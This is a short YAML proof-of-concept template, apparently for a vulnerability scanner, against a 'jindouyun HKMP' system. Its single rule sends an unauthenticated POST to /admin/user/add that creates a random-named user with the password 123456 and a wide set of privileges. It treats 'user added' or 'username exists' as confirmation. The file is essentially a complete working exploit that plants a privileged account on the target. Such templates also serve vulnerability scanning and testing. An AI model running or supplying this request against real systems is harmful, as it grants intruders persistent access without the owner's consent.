name: poc-yaml-jindouyun-HKMP-User-addition
transport: http


set:
  username: randomLowercase(6)

rules:
  r0:
    request:
      method: POST
      path: /admin/user/add
      headers:
        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
        Content-Type: application/json;charset=UTF-8
      body: '{"appId":"hkmp","mchId":"hkmp","deviceId":"hkmp","timestamp":1719305067,"nonce":5223015867,"sign":"hkmp","data":{"userCode":"{{username}}","userName":"{{username}}","password":"123456","privilege":["1000","8000","8010","2000","2001","2010","7000"],"adminUserCode":"admin","adminUserName":"系统管理员"}}'
    expression: response.status == 200 && response.body.bcontains(b'用户添加成功') || response.status == 200 && response.body.bcontains(b'用户名已存在')

expression: r0() 


detail:
  author: Superhero
  links:
    - https://blog.csdn.net/m0_60571842/article/details/140137358